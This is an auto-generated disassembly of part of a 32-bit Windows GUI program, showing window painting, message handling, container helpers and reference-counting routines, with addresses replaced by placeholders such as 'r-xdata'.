mov [ esp + 0x32 ] bl
mov [ esp + 0x33 ] 0x1
mov [ esp + 0x34 ] bl
mov [ esp + 0x35 ] bl
mov [ esp + 0x36 ] bl
mov [ esp + 0x37 ] bl
call [ lstrcpyA@IAT ]
lea eax [ esp + 0x14 ]
push eax
call [ CreateFontIndirectA@IAT ]
mov ebp eax
push ebp
push esi
call [ SelectObject@IAT ]
push 0x4
mov [ esp + 0x14 ] eax
call [ GetSysColor@IAT ]
push eax
push esi
call [ SetBkColor@IAT ]
push 0xff0000
push esi
call [ SetTextColor@IAT ]
push 0x1
push esi
call [ SetBkMode@IAT ]
lea ecx [ esp + 0xc8 ]
push ecx
push 0x100
push 0xd
push edi
call [ SendMessageA@IAT ]
lea edx [ esp + 0xc8 ]
push edx
call [ lstrlenA@IAT ]
push eax
lea eax [ esp + 0xcc ]
push eax
push 0x4
push ebx
push esi
call [ TextOutA@IAT ]
mov ecx [ esp + 0x10 ]
push ecx
push esi
call [ SelectObject@IAT ]
push ebp
call [ DeleteObject@IAT ]
lea edx [ esp + 0x88 ]
push edx
push edi
call [ EndPaint@IAT ]
pop ebp
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x2b8
retn 0x10
cmp eax 0x20
je r-xdata
push 0x7f8b
push 0x0
call [ LoadCursorA@IAT ]
push eax
call [ SetCursor@IAT ]
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x2b8
retn 0x10
cmp eax 0x201
je r-xdata
mov eax [ esp + 0x2d0 ]
mov edx [ esp + 0x2d4 ]
mov [ esp + 0x54 ] eax
mov eax [ esp + 0x2c8 ]
push 0xffffffeb
push eax
mov [ esp + 0x60 ] edx
mov [ esp + 0x58 ] 0x200
mov [ esp + 0x54 ] eax
call [ GetWindowLongA@IAT ]
mov edi [ SendMessageA@IAT ]
xor ebx ebx
push ebx
push 0x3
mov esi eax
push 0x403
push esi
call edi
push 0x7fff
push 0x2
push 0x403
push esi
call edi
lea ecx [ esp + 0x4c ]
push ecx
push ebx
push 0x407
push esi
call edi
push ebx
push ebx
push 0x41d
push esi
call edi
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x2b8
retn 0x10
mov ecx [ esp + 0x2d4 ]
mov edx [ esp + 0x2d0 ]
push ecx
mov ecx [ rw-data ]
push edx
push eax
mov eax [ esp + 0x2d4 ]
push eax
push ecx
call [ CallWindowProcA@IAT ]
pop edi
pop esi
pop ebx
add esp 0x2b8
retn 0x10
sub_40af40
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ ecx + 0x8 ]
sub ecx eax
mov eax 0x66666667
imul ecx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
mov eax edx
retn
retn
sub_40af70
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ ecx + 0x8 ]
sub ecx eax
mov eax 0x66666667
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov eax edx
retn
retn
sub_40afa0
mov edx [ esp + 0x4 ]
mov eax [ edx + 0x8 ]
push ebx
push esi
mov esi [ eax ]
mov [ edx + 0x8 ] esi
mov esi [ eax ]
mov bl [ esi + 0x2d ]
test bl bl
jne r-xdata
mov esi [ edx + 0x4 ]
mov [ eax + 0x4 ] esi
mov ecx [ ecx + 0x4 ]
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] edx
mov ecx [ edx + 0x4 ]
cmp edx [ ecx ]
jne r-xdata
mov [ ecx + 0x4 ] eax
pop esi
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
mov [ ecx + 0x8 ] eax
pop esi
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
mov [ ecx ] eax
pop esi
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
sub_40b000
mov edx [ esp + 0x4 ]
mov eax [ edx ]
push ebx
push esi
mov esi [ eax + 0x8 ]
mov [ edx ] esi
mov esi [ eax + 0x8 ]
mov bl [ esi + 0x2d ]
test bl bl
jne r-xdata
mov esi [ edx + 0x4 ]
mov [ eax + 0x4 ] esi
mov ecx [ ecx + 0x4 ]
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] edx
mov ecx [ edx + 0x4 ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
pop esi
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
mov [ ecx ] eax
pop esi
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
mov [ ecx + 0x8 ] eax
pop esi
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
sub_40b060
mov edx [ esp + 0x4 ]
cmp [ edx ] 0x63
mov eax ecx
jne r-xdata
mov ecx [ edx ]
mov [ eax ] ecx
mov edx [ edx + 0x4 ]
mov [ eax + 0x4 ] edx
retn 0x4
mov ecx [ edx + 0x4 ]
test ecx ecx
je r-xdata
inc [ ecx + 0x4 ]
sub_40b0b0
push esi
push edi
mov edi [ esp + 0xc ]
cmp [ edi ] 0x63
mov esi ecx
jne r-xdata
cmp [ esi ] 0x63
jne r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ edi ]
mov [ esi ] ecx
mov edx [ edi + 0x4 ]
pop edi
mov [ esi + 0x4 ] edx
mov eax esi
pop esi
retn 0x4
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
inc [ eax + 0x4 ]
dec [ ecx + 0x4 ]
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x18 ]
sub_40b120
movsx eax [ ecx ]
add eax 0xffffff9e
cmp eax 0x11
ja r-xdata
xor al al
retn
movzx eax [ eax + lookup_table_40b184 ]
jmp [ eax * 4 + jump_table_40b170 ]
mov al [ ecx + 0x4 ]
retn
mov edx [ ecx + 0x4 ]
xor eax eax
test edx edx
setne al
retn
fld [ ecx + 0x4 ]
fcomp [ r--data ]
fnstsw ax
test ah 0x44
jpo r-xdata
mov edx [ ecx + 0x1c ]
xor eax eax
test edx edx
setne al
retn
xor eax eax
retn
mov eax 0x1
retn
sub_40b1a0
movsx eax [ ecx ]
add eax 0xffffff9e
cmp eax 0x11
ja r-xdata
xor eax eax
retn
movzx eax [ eax + lookup_table_40b1e8 ]
jmp [ eax * 4 + jump_table_40b1d4 ]
movzx eax [ ecx + 0x4 ]
retn
mov eax [ ecx + 0x4 ]
retn
fld [ ecx + 0x4 ]
jmp sub_4b64c4
mov eax [ ecx + 0x1c ]
retn
sub_40b200
push ecx
movsx eax [ ecx ]
add eax 0xffffff9e
cmp eax 0x11
ja r-xdata
fld [ r--data ]
movzx eax [ eax + lookup_table_40b260 ]
jmp [ eax * 4 + jump_table_40b24c ]
movzx ecx [ ecx + 0x4 ]
mov [ esp ] ecx
fild [ esp ]
pop ecx
retn
fild [ ecx + 0x4 ]
pop ecx
retn
fld [ ecx + 0x4 ]
pop ecx
retn
mov edx [ ecx + 0x1c ]
fild [ ecx + 0x1c ]
test edx edx
jge r-xdata
pop ecx
retn
fadd [ r--data ]
pop ecx
retn
sub_40b280
cmp [ ecx + 0xc ] 0x2000000c
jne r-xdata
xor eax eax
retn
movzx eax [ ecx + 0x32 ]
imul eax [ ecx + 0x28 ]
cdq
and edx 0x7
add eax edx
mov edx [ ecx + 0x2c ]
push esi
mov esi eax
shl edx 0x1
mov eax 0x55555556
imul edx
sar esi 0x3
add esi 0x3
mov eax edx
shr eax 0x1f
and esi 0xfffffffc
add edx eax
mov eax [ ecx + 0x20 ]
imul esi edx
sub eax esi
pop esi
retn
sub_40b2d0
cmp [ ecx + 0xc ] 0x2000000c
jne r-xdata
xor eax eax
retn
movzx eax [ ecx + 0x32 ]
imul eax [ ecx + 0x28 ]
cdq
and edx 0x7
add eax edx
mov edx [ ecx + 0x2c ]
push esi
mov esi eax
shl edx 0x1
mov eax 0x55555556
imul edx
mov eax edx
shr eax 0x1f
add edx eax
sar esi 0x3
push edi
add esi 0x3
and esi 0xfffffffc
mov edi edx
imul edi esi
mov eax esi
cdq
sub eax edx
mov edx [ ecx + 0x20 ]
sar eax 0x1
sub eax edi
pop edi
add eax edx
pop esi
retn
sub_40b320
mov eax [ esp + 0x4 ]
push ebx
push esi
push edi
mov edi [ eax ]
test edi edi
mov ebx ecx
je r-xdata
mov esi [ ebx ]
test esi esi
je r-xdata
inc [ edi + 0xd48 ]
mov [ ebx ] edi
pop edi
pop esi
pop ebx
retn 0x4
dec [ esi + 0xd48 ]
jne r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
sub_40b360
push esi
mov esi [ ecx ]
test esi esi
je r-xdata
pop esi
retn
dec [ esi + 0xd48 ]
jne r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
sub_40b390
push 0xffffffff
push sub_4bee1b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
mov ebx ecx
push esi
mov [ esp + 0x8 ] ebx
xor eax eax
mov [ esp + 0x14 ] eax
mov [ ebx + 0x4 ] eax
mov [ ebx ] r--data
mov [ ebx + 0x38 ] eax
mov esi [ esp + 0x1c ]
cmp esi eax
mov [ esp + 0x14 ] 0x2
je r-xdata
push ebp
push edi
mov edi [ ebx + 0x38 ]
cmp edi eax
je r-xdata
inc [ esi + 0xd48 ]
mov [ ebx + 0x38 ] esi
mov eax [ esi + 0x10 ]
mov ecx [ esi + 0x14 ]
mov ebp [ esi + 0xc ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x10 ] ecx
lea edx [ ebx + 0x8 ]
xor eax eax
mov ecx 0xc
mov edi edx
[ edi ]
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x10 ]
mov [ edx ] eax
mov [ ebx + 0xc ] ecx
mov eax [ esi + 0x34 ]
test eax eax
jne r-xdata
dec [ edi + 0xd48 ]
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp ebp 0x2000000c
jg r-xdata
mov ecx edi
call sub_43fe30
push edi
call j_sub_4b66ed#2
add esp 0x4
mov [ ebx + 0x1c ] 0x50000001
cmp [ esi + 0x32 ] 0x20
jne r-xdata
sub ebp 0x20000010
je r-xdata
je r-xdata
mov ecx [ esp + 0xc ]
pop esi
mov eax ebx
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
cmp [ esi + 0x4c ] 0xff0000
jne r-xdata
mov [ ebx + 0x1c ] 0x60000004
jmp r-xdata
sub ebp 0x8
je r-xdata
mov [ ebx + 0x1c ] 0xa0000008
jmp r-xdata
add ebp 0xefffffff
cmp ebp 0x1f
ja r-xdata
cmp [ esi + 0x50 ] 0xff00
jne r-xdata
mov eax [ esi + 0xd48 ]
dec eax
pop edi
mov [ esp + 0x18 ] 0xffffffff
mov [ esi + 0xd48 ] eax
pop ebp
jne r-xdata
sub ebp 0x20000008
jne r-xdata
movzx edx [ ebp + lookup_table_40b54c ]
jmp [ edx * 4 + jump_table_40b53c ]
cmp [ esi + 0x54 ] 0xff
jne r-xdata
mov [ ebx + 0x1c ] 0x50000002
jmp r-xdata
mov edi [ esi + 0x44 ]
test edi edi
jne r-xdata
mov [ ebx + 0x1c ] 0x50000002
jmp r-xdata
xor ebp ebp
test edi edi
jle r-xdata
mov cl [ esi + 0x32 ]
mov edi 0x1
shl edi cl
xor eax eax
cmp ebp edi
sete al
dec eax
and eax 0x50000001
mov [ ebx + 0x1c ] eax
jmp r-xdata
lea eax [ esi + 0x4c ]
nop
cmp cl [ eax + 0x2 ]
jne r-xdata
inc ebp
add eax 0x4
cmp ebp edi
jl r-xdata
mov cl [ eax ]
cmp cl [ eax + 0x1 ]
jne r-xdata
sub_40b550
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ecx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ecx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ edx ]
nop
nop
nop
nop
push esi
mov esi ecx
call sub_40b590
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_4b66ed#2
add esp 0x4
sub_40b590
push 0xffffffff
push sub_4bed98
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
push edi
mov [ esp + 0x8 ] esi
mov [ esi ] r--data
mov edi [ esi + 0x38 ]
test edi edi
mov [ esp + 0x14 ] 0x0
je r-xdata
mov ecx [ esp + 0xc ]
mov [ esi ] r--data
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
dec [ edi + 0xd48 ]
jne r-xdata
mov ecx edi
call sub_43fe30
push edi
call j_sub_4b66ed#2
add esp 0x4
sub_40b600
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
push edi
mov edi [ esp + 0x18 ]
cmp [ esi ] 0x63
jne r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ edi ]
mov [ esi ] ecx
mov edx [ edi + 0x4 ]
mov [ esi + 0x4 ] edx
add esi 0x8
cmp esi ebx
jne r-xdata
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
inc [ eax + 0x4 ]
cmp [ edi ] 0x63
jne r-xdata
pop edi
dec [ ecx + 0x4 ]
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x14 ]
sub_40b660
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
cmp esi ebx
je r-xdata
mov eax [ esp + 0x14 ]
pop esi
pop ebx
retn
push edi
mov edi [ esp + 0x18 ]
cmp [ edi ] 0x63
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ esi ]
mov [ edi ] ecx
mov edx [ esi + 0x4 ]
mov [ edi + 0x4 ] edx
add esi 0x8
add edi 0x8
cmp esi ebx
jne r-xdata
mov ecx [ edi + 0x4 ]
test ecx ecx
je r-xdata
inc [ eax + 0x4 ]
cmp [ esi ] 0x63
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
dec [ ecx + 0x4 ]
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x14 ]
sub_40b6c0
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi [ esp + 0x14 ]
cmp ebx esi
je r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x18 ]
pop esi
mov [ eax ] ecx
pop ebx
retn
push edi
mov edi [ esp + 0x1c ]
cmp [ edi ] 0x63
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp esi ebx
mov ecx [ esi ]
mov [ edi ] ecx
mov edx [ esi + 0x4 ]
mov [ edi + 0x4 ] edx
jne r-xdata
mov ecx [ edi + 0x4 ]
test ecx ecx
je r-xdata
inc [ eax + 0x4 ]
sub esi 0x8
sub edi 0x8
cmp [ esi ] 0x63
jne r-xdata
mov eax [ esp + 0x10 ]
mov [ eax ] edi
pop edi
pop esi
pop ebx
retn
dec [ ecx + 0x4 ]
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x14 ]
sub_40b730
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
retn
push ebx
push edi
mov edi [ eax + 0x4 ]
mov al [ esi + 0x4 ]
test al al
je r-xdata
mov eax [ esi ]
cmp [ eax ] 0x0
mov ebx [ MessageBoxA@IAT ]
jle r-xdata
mov [ edi ] 0x0
mov eax [ esi ]
test eax eax
je r-xdata
push 0x0
push r--data
push r--data
push 0x0
call ebx
mov eax [ edi + 0xc ]
test eax eax
jle r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ecx + 0xc ]
dec edx
push eax
mov [ ecx + 0xc ] edx
call j_sub_4b66ed#2
add esp 0x4
mov ecx edi
call sub_40ac40
push edi
call j_sub_4b66ed#2
add esp 0x4
pop edi
mov [ esi ] 0x0
pop ebx
push 0x0
push r--data
push r--data
push 0x0
call ebx
sub_40b7c0
mov eax [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push esi
mov esi [ esp + 0x8 ]
push eax
push ecx
mov ecx [ esp + 0x1c ]
mov eax esp
mov [ eax ] ecx
push ecx
mov eax esp
push ecx
mov ecx [ esp + 0x1c ]
mov [ eax ] edx
mov eax esp
push esi
mov [ eax ] ecx
call sub_40b6c0
add esp 0x14
mov eax esi
pop esi
retn
sub_40b800
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
cmp esi ebx
je r-xdata
mov eax [ esp + 0x14 ]
pop esi
pop ebx
retn
push edi
mov edi [ esp + 0x18 ]
cmp [ edi ] 0x63
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ esi ]
mov [ edi ] ecx
mov edx [ esi + 0x4 ]
mov [ edi + 0x4 ] edx
add esi 0x8
add edi 0x8
cmp esi ebx
jne r-xdata
mov ecx [ edi + 0x4 ]
test ecx ecx
je r-xdata
inc [ eax + 0x4 ]
cmp [ esi ] 0x63
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
dec [ ecx + 0x4 ]
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x18 ]
sub_40b860
push esi
push edi
mov esi ecx
xor edi edi
pop edi
pop esi
retn
mov eax [ esi + 0x3c ]
sub eax ecx
sar eax 0x2
cmp edi eax
jae r-xdata
mov eax ecx
mov ecx [ eax + edi * 4 ]
mov eax [ ecx ]
test eax eax
je r-xdata
call sub_40b730
mov edx [ eax + 0x4 ]
mov eax [ edx + 0xc ]
test eax eax
jg r-xdata
mov ecx [ esi + 0x38 ]
test ecx ecx
je r-xdata
inc edi
jmp r-xdata
sub_40b8a0
push 0xffffffff
push sub_4bee60
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x49c
mov eax [ esp + 0x4b4 ]
push ebp
push esi
xor esi esi
mov [ esp + 0x10 ] esi
push edi
mov [ rw-data ] eax
mov [ esp + 0xc ] esi
mov edi [ esp + 0x4b8 ]
mov ebp [ edi + 0x38 ]
cmp [ ebp ] eax
mov [ esp + 0x4b0 ] 0x1
je r-xdata
cmp ebp esi
je r-xdata
push esi
push esi
push esi
push eax
call sub_4706c0
add esp 0x10
cmp eax esi
jge r-xdata
mov eax [ ebp + 0x10 ]
lea ecx [ edi + 0x8 ]
mov [ ecx ] eax
mov eax [ ebp + 0x14 ]
mov [ edi + 0xc ] eax
cmp [ ebp + 0x8 ] esi
mov [ esp + 0xc ] ebp
mov [ esp + 0x10 ] ecx
jne r-xdata
inc [ ebp + 0xd48 ]
mov ecx [ rw-data ]
mov ebp [ ecx + eax * 4 ]
mov eax [ esp + 0x4bc ]
mov [ eax ] esi
jmp r-xdata
inc [ ebp + 0x8 ]
push ebx
lea ecx [ esp + 0x1c ]
call sub_439410
mov ebx [ ebp + 0xc ]
cmp ebx 0x2000000c
mov [ esp + 0x4b4 ] 0x2
jne r-xdata
mov eax [ ebp + 0x4 ]
cmp eax esi
je r-xdata
mov ecx [ esp + 0x4a8 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0x4a8
retn 0x10
mov ecx [ esp + 0x4c8 ]
mov eax [ ebp + 0x14 ]
mov edi [ ebp + 0x20 ]
push ecx
push eax
mov eax [ ebp + 0x10 ]
push eax
push 0x0
push 0x0
mov ecx ebp
call sub_40b2d0
push eax
push esi
push edi
lea edx [ ebp + 0x24 ]
push edx
push ebx
lea ecx [ esp + 0x44 ]
call sub_43f940
test eax eax
pop ebx
je r-xdata
movzx eax [ ebp + 0x32 ]
imul eax [ ebp + 0x28 ]
mov ecx [ ebp + 0x2c ]
cdq
and edx 0x7
add eax edx
mov edi eax
mov esi [ ebp + 0x20 ]
shl ecx 0x1
mov eax 0x55555556
imul ecx
sar edi 0x3
mov eax edx
add edi 0x3
shr eax 0x1f
and edi 0xfffffffc
add edx eax
imul edi edx
sub esi edi
push eax
call [ LocalLock@IAT ]
mov [ ebp + 0x20 ] eax
mov edi [ esp + 0x10 ]
mov ecx 0xc
lea esi [ esp + 0x478 ]
[ edi ] [ esi ]
mov esi [ esp + 0x4bc ]
push esi
lea ecx [ esp + 0x1c ]
call sub_40a710
lea ecx [ esp + 0x18 ]
mov [ esp + 0x14 ] 0x1
mov [ esp + 0x4b0 ] 0x1
call sub_43a1f0
mov eax [ ebp + 0xd48 ]
dec eax
mov [ esp + 0x4b0 ] 0x0
mov [ ebp + 0xd48 ] eax
jne r-xdata
mov edx [ esp + 0x4c0 ]
mov eax [ esp + 0x4c4 ]
mov ecx [ eax ]
push edx
push r--data
push eax
call [ ecx + 0x14 ]
add esp 0xc
mov eax esi
mov ecx ebp
call sub_43fe30
push ebp
call j_sub_4b66ed#2
add esp 0x4
sub_40ba70
push esi
mov esi ecx
cmp [ esi + 0x20 ] 0x10
jb r-xdata
xor eax eax
mov [ esi + 0x20 ] 0xf
mov [ esi + 0x1c ] eax
mov [ esi + 0xc ] al
pop esi
retn
mov eax [ esi + 0xc ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_40baa0
mov eax [ rw-data ]
test eax eax
push ebx
mov ebx [ IsDialogMessageA@IAT ]
push edi
mov edi [ esp + 0xc ]
je r-xdata
mov eax [ rw-data ]
shl eax 0x4
mov ecx [ eax + rw-data ]
push esi
mov esi [ eax + rw-data ]
cmp esi ecx
je r-xdata
push edi
push eax
call ebx
test eax eax
je r-xdata
pop esi
pop edi
xor eax eax
pop ebx
retn
mov edi edi
pop edi
mov eax 0x1
pop ebx
retn
mov eax [ rw-data ]
shl eax 0x4
mov ecx [ eax + rw-data ]
add esi 0xa0
cmp esi ecx
jne r-xdata
push edi
push eax
call ebx
test eax eax
jne r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
pop esi
pop edi
mov eax 0x1
pop ebx
retn
sub_40bb50
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
cmp ecx edx
mov eax [ esp + 0xc ]
je r-xdata
retn
push esi
mov si [ ecx ]
mov [ eax ] si
add ecx 0x2
add eax 0x2
cmp ecx edx
jne r-xdata
pop esi
sub_40bba0
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
cmp ecx esi
je r-xdata
pop esi
retn
mov dl [ ecx ]
mov [ eax ] dl
inc eax
inc ecx
cmp ecx esi
jne r-xdata
sub_40bbe0
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
cmp esi edi
je r-xdata
pop edi
pop esi
retn
mov edi edi
add esi 0x8
cmp esi edi
jne r-xdata
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
cmp [ esi ] 0x63
jne r-xdata
dec [ ecx + 0x4 ]
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x18 ]
sub_40bc20
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
cmp esi edi
je r-xdata
pop edi
pop esi
retn
mov edi edi
add esi 0x8
cmp esi edi
jne r-xdata
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
cmp [ esi ] 0x63
jne r-xdata
dec [ ecx + 0x4 ]
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x14 ]
sub_40bc80
mov eax [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
push ecx
mov ecx [ esp + 0x14 ]
push ecx
push ecx
mov eax esp
push ecx
mov ecx [ esp + 0x18 ]
mov [ eax ] edx
mov eax esp
mov [ eax ] ecx
call sub_417b90
add esp 0x14
retn 0xc
sub_40bcb0
push esi
xor eax eax
mov esi ecx
push 0xffffffff
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xf
push eax
mov [ esi + 0x4 ] al
mov eax [ esp + 0x10 ]
push eax
call sub_401dd0
mov ecx [ esp + 0xc ]
mov edx [ ecx ]
mov [ esi + 0x1c ] edx
mov eax esi
pop esi
retn 0x8
sub_40bd20
mov eax [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
push eax
push ecx
mov ecx [ esp + 0x1c ]
push ecx
push esi
push edi
call sub_417720
add esp 0x14
lea eax [ edi + esi * 8 ]
pop edi
pop esi
retn 0xc
sub_40bd70
push esi
mov esi ecx
mov [ esi ] r--data
cmp [ esi + 0x24 ] 0x10
jb r-xdata
xor eax eax
mov [ esi + 0x24 ] 0xf
mov [ esi + 0x20 ] eax
mov [ esi + 0x10 ] al
mov ecx esi
pop esi
jmp sub_4b60f6
mov eax [ esi + 0x10 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_40bdb0
mov eax 0x1208
call sub_4b6180
push ebx
mov ebx [ esp + 0x1214 ]
push ebp
mov ebp [ esp + 0x1214 ]
push esi
push edi
push ebx
push rw-data
xor edi edi
push edi
push r--data
push r--data
mov ecx ebp
call sub_435100
test eax eax
jne r-xdata
push ebx
push rw-data
push edi
push r--data
push r--data
mov ecx ebp
call sub_4351e0
push ebx
push rw-data
push edi
push r--data
push r--data
mov ecx ebp
call sub_435100
mov esi 0x1
mov [ esp + 0x10 ] edi
mov [ esp + 0x14 ] 0x15
dec [ rw-data ]
lea eax [ esp + 0x118 ]
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
test bl bl
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ esp + 0x11c ]
push ecx
mov ecx [ esp + 0x18 ]
lea ecx [ ecx + rw-data ]
call sub_401e80
push esi
lea edx [ esp + 0x1c ]
push r--data
push edx
call [ wsprintfA@IAT ]
mov ecx [ edi + rw-data ]
add esp 0xc
push ebx
push 0x1000
lea eax [ esp + 0x220 ]
push eax
push ecx
lea edx [ esp + 0x28 ]
push edx
push r--data
mov ecx ebp
call sub_435230
test eax eax
je r-xdata
lea eax [ esp + 0x218 ]
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
test bl bl
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ esp + 0x10 ]
sub eax edx
push eax
lea eax [ esp + 0x21c ]
push eax
lea ecx [ ecx + rw-data ]
call sub_401e80
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
add ecx 0x1c
inc esi
add edi 0x4
dec eax
mov [ esp + 0x10 ] ecx
mov [ esp + 0x14 ] eax
jne r-xdata
push esi
lea eax [ esp + 0x1c ]
push r--data
push eax
call [ wsprintfA@IAT ]
mov edx [ edi + rw-data ]
add esp 0xc
push ebx
push 0x100
lea ecx [ esp + 0x120 ]
push ecx
push edx
lea eax [ esp + 0x28 ]
push eax
push r--data
mov ecx ebp
call sub_435230
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1208
retn
sub_40bf40
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
pop esi
pop ecx
retn
mov ecx [ esp + 0x4 ]
mov edx [ esi + 0x8 ]
push ecx
push esi
push edx
push eax
call sub_40bbe0
mov eax [ esi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x14
sub_40bf80
push 0xffffffff
push sub_4bee98
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
mov eax r--data
mov [ esp + 0x18 ] 0xf
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x4 ] 0x0
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x8 ]
call sub_401e80
lea eax [ esp ]
push eax
lea ecx [ esp + 0x20 ]
mov [ esp + 0x50 ] 0x0
call sub_402340
push r--data
lea ecx [ esp + 0x20 ]
push ecx
mov [ esp + 0x24 ] r--data
call sub_4b5bd2
int3
sub_40c000
mov edx [ esp + 0xc ]
push ebx
mov ebx [ esp + 0xc ]
cmp ebx edx
push esi
push edi
mov esi ecx
je r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
mov [ eax ] ebx
pop ebx
retn 0xc
mov ecx [ esp + 0x10 ]
mov eax [ esi + 0x8 ]
push ecx
push ebx
push ecx
mov ecx esp
mov [ ecx ] eax
push ecx
mov eax esp
mov [ eax ] edx
call sub_40b660
mov edx [ esp + 0x20 ]
push edx
mov edi eax
mov eax [ esi + 0x8 ]
push esi
push eax
push edi
call sub_40bc20
add esp 0x20
mov [ esi + 0x8 ] edi
sub_40c050
push 0xffffffff
push sub_4bee98
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x50
push esi
push edi
mov edi [ esp + 0x6c ]
mov al [ edi + 0x2d ]
test al al
mov [ esp + 0xc ] ecx
je r-xdata
push ebx
mov ebx edi
push ebp
lea ecx [ esp + 0x74 ]
mov [ esp + 0x18 ] ebx
call sub_432ab0
mov ebp [ edi ]
mov al [ ebp + 0x2d ]
test al al
lea eax [ edi + 0x8 ]
jne r-xdata
xor esi esi
mov eax r--data
mov [ esp + 0x2c ] 0xf
mov [ esp + 0x28 ] esi
mov [ esp + 0x18 ] 0x0
lea edx [ eax + 0x1 ]
mov ebp [ eax ]
mov edx [ eax ]
